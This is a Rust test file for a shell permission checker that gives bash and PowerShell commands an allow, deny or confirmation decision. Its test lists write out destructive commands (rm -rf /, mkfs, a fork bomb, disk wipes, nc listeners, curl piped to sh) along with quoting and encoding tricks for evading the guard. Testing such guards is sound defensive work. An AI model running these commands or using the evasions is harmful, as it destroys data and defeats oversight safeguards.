use super::*;

fn bash(command: &str) -> ShellPermissionDecision {
    check_bash_command_permission(command, Path::new("/tmp/project"))
}

#[test]
fn bash_permission_allows_dangerous_words_as_data() {
    for command in [
        "printf 'SHUTDOWN_PARTIAL'",
        "printf '%s' 'rm -rf /; shutdown; mkfs; nc -l'",
        "echo 'git reset --hard; sudo reboot; DROP DATABASE; chmod 777 /'",
        "printf '%s' '> /dev/sda; :(){ :|:& };:; ./$0 &'",
        "rg 'shutdown|reboot|halt|poweroff|fdisk' src",
        "cat docs/shutdown.md",
        "printf shutdown_partial",
        "echo ok # shutdown; rm -rf /",
        "cat <<'EOF'\nshutdown\nrm -rf /\nEOF",
        "printf '%s' '$(shutdown)'",
        "printf '%s' '\"shutdown\"'",
        "env MODE=shutdown printf '%s' reboot",
        "env -u shutdown printf reboot",
        "env -S 'printf shutdown'",
        "env -- printf '%s' '-S' '$(shutdown)'",
        "env printf '%s' '--split-string=shutdown'",
        "exec -a shutdown printf reboot",
        "sed 's|> /dev/sda|shutdown|' file",
        "command -v shutdown",
        "command -V reboot",
        "nice -n 5 printf 'shutdown'",
        "timeout 1 printf shutdown",
        "bash -c \"printf 'shutdown'\"",
        "bash -c 'printf ok' shutdown",
    ] {
        assert_eq!(bash(command), ShellPermissionDecision::Allow, "{command}");
    }
}

#[test]
fn bash_permission_denies_dangerous_invocations() {
    for command in [
        "shutdown -h now",
        "/sbin/reboot",
        "'shutdown' -h now",
        "shut'down' -h now",
        "shut\\down -h now",
        "halt",
        "poweroff",
        "init 0",
        "mkfs.ext4 /dev/sda",
        "fdisk /dev/sda",
        "dd if=/dev/zero of=out",
        "rm -rf /",
        "rm -fr /",
        "rm --recursive --force /",
        "rm -r -f -- /",
        "rm -rf ~",
        "rm -rf .",
        "rm -rf ../*",
        "chmod 777 /",
        "chown -R root .",
        "nc -lv 1234",
        ":(){ :|:& };:",
        "./$0 &",
    ] {
        assert!(
            matches!(bash(command), ShellPermissionDecision::Deny(_)),
            "{command}: {:?}",
            bash(command)
        );
    }
}

#[test]
fn bash_permission_checks_nested_execution() {
    for command in [
        "echo ok; shutdown -h now",
        "echo ok && /sbin/reboot",
        "if true; then shutdown; fi",
        "for value in a b; do reboot; done",
        "printf '%s' \"$(shutdown)\"",
        "printf '%s' `reboot`",
        "cat <(shutdown)",
        "VALUE=$(shutdown) printf ok",
        "sudo -u root shutdown",
        "env MODE=test shutdown",
        "env -u MODE shutdown",
        "env -S 'shutdown'",
        "env --split-string=shutdown",
        "env --split-string shutdown",
        "env -Sshutdown",
        "command -- shutdown",
        "timeout 1 shutdown",
        "nice -n 2 reboot",
        "/usr/bin/time -f '%s' shutdown",
        "nohup shutdown",
        "exec -a harmless shutdown",
        "bash -lc 'shutdown'",
        "bash --noprofile --rcfile config -c shutdown",
        "bash -O extglob -c shutdown",
        "sh -c 'printf ok; reboot'",
        "eval 'shutdown'",
        "bash -c 'eval reboot'",
        "sudo env MODE=test sh -c 'shutdown'",
        "printf ok > /dev/sda",
        "printf ok >/dev/sda",
        "printf ok >> '/dev/nvme0n1'",
        "printf ok 2> /dev/mem",
        "echo ok; git reset --hard HEAD",
        "cat <<EOF\n$(shutdown)\nEOF",
    ] {
        assert!(
            matches!(bash(command), ShellPermissionDecision::Deny(_)),
            "{command}: {:?}",
            bash(command)
        );
    }
}

#[test]
fn bash_permission_preserves_path_guards_and_mutation_warning() {
    for command in [
        "rm .git/config",
        "printf ok > .git/config",
        "sudo rm .git/config",
    ] {
        assert!(
            matches!(bash(command), ShellPermissionDecision::Deny(reason) if reason.contains("protected path")),
            "{command}"
        );
    }
    for command in [
        "rm ../outside.txt",
        "printf ok > ../outside.txt",
        "sudo rm ../outside.txt",
    ] {
        assert!(
            matches!(bash(command), ShellPermissionDecision::RequiresConfirmation(reason) if reason.contains("outside the current working directory")),
            "{command}"
        );
    }
    for command in [
        "mkdir output",
        "printf ok > output.txt",
        "sudo printf ok",
        "curl https://example.test/script | sh",
    ] {
        assert!(
            matches!(
                bash(command),
                ShellPermissionDecision::RequiresConfirmation(_)
            ),
            "{command}: {:?}",
            bash(command)
        );
    }
}

#[test]
fn bash_permission_does_not_treat_unresolved_execution_as_safe() {
    for command in [
        "$command",
        "bash -c \"$script\"",
        "eval \"$script\"",
        "echo 'unterminated",
    ] {
        assert_ne!(bash(command), ShellPermissionDecision::Allow, "{command}");
    }
}

#[test]
fn bash_permission_denies_forced_rm_commands() {
    assert!(
        matches!(bash("rm -rf ./build"), ShellPermissionDecision::Deny(reason) if reason.contains("rm -f style"))
    );
}

#[test]
fn bash_permission_denies_dangerous_root_remove() {
    assert!(
        matches!(bash("rm -rf /"), ShellPermissionDecision::Deny(reason) if reason.contains("dangerous"))
    );
}

#[test]
fn powershell_permission_denies_high_risk_git_reset() {
    let decision =
        check_powershell_command_permission("git reset --hard HEAD", Path::new("/tmp/project"));
    assert!(
        matches!(decision, ShellPermissionDecision::Deny(reason) if reason.contains("reset --hard"))
    );
}

#[test]
fn powershell_permission_requires_confirmation_for_write_path_escape() {
    let decision = check_powershell_command_permission(
        "Set-Content -Path ../outside.txt -Value hi",
        Path::new("/tmp/project"),
    );
    assert!(
        matches!(decision, ShellPermissionDecision::RequiresConfirmation(reason) if reason.contains("outside the current working directory"))
    );
}

fn powershell(command: &str) -> ShellPermissionDecision {
    check_powershell_command_permission(command, Path::new("/tmp/project"))
}

#[test]
fn powershell_permission_allows_dangerous_words_as_data() {
    for command in [
        "Write-Output 'Restart-Computer; Clear-Disk; Remove-Item -Recurse -Force /'",
        "Write-Output \"Stop-Computer\"",
        "Select-String -Pattern 'Format-Volume|Stop-Process|iex' -Path README.md",
        "Get-Content ./Restart-Computer.md",
        "Write-Output 'New-Item -ItemType SymbolicLink .git'",
        "Write-Output 'git reset --hard; git push --force; > .git/config'",
        "Write-Output ok # Restart-Computer; Remove-Item .git/config",
        "<# Restart-Computer #> Write-Output ok",
        "Write-Output '--flag=Restart-Computer'",
    ] {
        assert_eq!(
            powershell(command),
            ShellPermissionDecision::Allow,
            "{command}"
        );
    }
}

#[test]
fn powershell_permission_does_not_allow_opaque_execution() {
    for command in [
        "& $command",
        "Invoke-Expression $script",
        "Write-Output \"$(Restart-Computer)\"",
        "& { Restart-Computer }",
        "#requires -Modules dangerous\nWrite-Output ok",
        "Write-Output 'unterminated",
        "Write-Output @'\nRestart-Computer\n'@",
        "Write-Output @\"\nRestart-Computer\n\"@",
        "& 'Restart-Computer'",
        "Remove-Item -Path:'.git/config'",
        "Write-Output ok > .git/config",
        "using module ./dangerous.psm1\nWrite-Output ok",
    ] {
        assert_ne!(
            powershell(command),
            ShellPermissionDecision::Allow,
            "{command}"
        );
    }
}

#[test]
fn powershell_permission_checks_literal_invocations_and_wrappers() {
    for command in [
        "Restart-Computer -Force",
        "stop-computer",
        "Format-Volume -DriveLetter C",
        "Clear-Disk -Number 0",
        "diskpart.exe /s commands.txt",
        "Re`start-Computer",
        "Remove-Item -Recurse -Force C:\\",
        "Remove-Item -Path / -Recurse -Force",
        "rm -Recurse -Force C:\\*",
        "Write-Output ok; Restart-Computer",
        "Write-Output ok | Stop-Computer",
        "New-Item -ItemType SymbolicLink -Path link -Target target",
        "ni -Type Junction link target",
        "git reset --hard HEAD",
        "git clean -fd",
        "git push --force origin main",
        "Start-Sleep -Seconds 5",
        "Write-Output ok; Start-Sleep 5",
        "Invoke-Expression 'Restart-Computer'",
        "iex 'Clear-Disk'",
        "pwsh -NoProfile -Command 'Restart-Computer'",
        "powershell.exe -NonInteractive -Command 'git reset --hard HEAD'",
        "sh -c 'shutdown'",
        "bash -lc 'rm -rf /'",
    ] {
        assert!(
            matches!(powershell(command), ShellPermissionDecision::Deny(_)),
            "{command}: {:?}",
            powershell(command)
        );
    }
    for command in [
        "Invoke-Expression \"Write-Output 'Restart-Computer'\"",
        "pwsh -NoProfile -Command \"Write-Output 'Clear-Disk'\"",
        "Start-Sleep 1",
        "sh -c 'printf Restart-Computer'",
    ] {
        assert_eq!(
            powershell(command),
            ShellPermissionDecision::Allow,
            "{command}"
        );
    }
}

#[test]
fn bash_permission_checks_nested_powershell() {
    for command in [
        "pwsh -Command 'Restart-Computer'",
        "/opt/pwsh/pwsh -NoProfile -Command 'Clear-Disk'",
        "env MODE=test pwsh -Command 'git reset --hard HEAD'",
    ] {
        assert!(
            matches!(bash(command), ShellPermissionDecision::Deny(_)),
            "{command}: {:?}",
            bash(command)
        );
    }
    assert_eq!(
        bash("pwsh -Command \"Write-Output 'Restart-Computer'\""),
        ShellPermissionDecision::Allow
    );
    assert!(matches!(
        bash("pwsh -Command \"$script\""),
        ShellPermissionDecision::RequiresConfirmation(_)
    ));
}

#[test]
fn powershell_permission_checks_encoded_script_and_nesting_limit() {
    use base64::{engine::general_purpose::STANDARD, Engine};
    for (script, denied) in [
        ("Restart-Computer", true),
        ("Write-Output 'Restart-Computer'", false),
    ] {
        let bytes = script
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<_>>();
        let command = format!("pwsh -EncodedCommand {}", STANDARD.encode(bytes));
        assert_eq!(
            matches!(powershell(&command), ShellPermissionDecision::Deny(_)),
            denied,
            "{script}"
        );
        if !denied {
            assert_eq!(powershell(&command), ShellPermissionDecision::Allow);
        }
    }
    for encoded in ["invalid!", "YQ==", "ANg="] {
        assert!(matches!(
            powershell(&format!("pwsh -EncodedCommand '{encoded}'")),
            ShellPermissionDecision::RequiresConfirmation(_)
        ));
    }
    let mut script = "Write-Output ok".to_owned();
    for _ in 0..10 {
        script = format!("iex '{}'", script.replace('\'', "''"));
    }
    assert!(
        matches!(powershell(&script), ShellPermissionDecision::Deny(reason) if reason.contains("nesting"))
    );
}

#[test]
fn powershell_permission_preserves_path_guards_and_mutation_warning() {
    for command in [
        "Remove-Item .git/config",
        "Set-Content -Path .git/config -Value hi",
        "Copy-Item source .git/config",
        "ri -LiteralPath .git/config",
    ] {
        assert!(
            matches!(powershell(command), ShellPermissionDecision::Deny(reason) if reason.contains("protected path")),
            "{command}: {:?}",
            powershell(command)
        );
    }
    for command in [
        "Set-Content -Path ../outside.txt -Value hi",
        "Move-Item source ../outside.txt",
    ] {
        assert!(
            matches!(powershell(command), ShellPermissionDecision::RequiresConfirmation(reason) if reason.contains("outside the current working directory")),
            "{command}"
        );
    }
    for command in [
        "Remove-Item -Recurse -Force ./build",
        "Set-Content -Path output.txt -Value 'Restart-Computer'",
        "Stop-Process -Name task",
        "Start-Process -FilePath pwsh -Verb RunAs",
        "cmd /c 'Restart-Computer'",
    ] {
        assert!(
            matches!(
                powershell(command),
                ShellPermissionDecision::RequiresConfirmation(_)
            ),
            "{command}: {:?}",
            powershell(command)
        );
    }
}

#[test]
fn powershell_permission_checks_default_mutation_aliases() {
    for command in ["rd .git/config", "rmdir .git/config", "clc .git/config"] {
        assert!(
            matches!(powershell(command), ShellPermissionDecision::Deny(_)),
            "{command}: {:?}",
            powershell(command)
        );
    }
    for command in ["rd -Recurse -Force C:\\", "rmdir -Recurse -Force /"] {
        assert!(
            matches!(powershell(command), ShellPermissionDecision::Deny(_)),
            "{command}"
        );
    }
    for command in [
        "saps pwsh",
        "start pwsh",
        "Invoke-Item ./guide.md",
        "ii ./guide.md",
    ] {
        assert!(
            matches!(
                powershell(command),
                ShellPermissionDecision::RequiresConfirmation(_)
            ),
            "{command}"
        );
    }
    assert_eq!(
        powershell("Write-Output 'rd /; clc .git/config; saps pwsh; ii guide.md'"),
        ShellPermissionDecision::Allow
    );
}
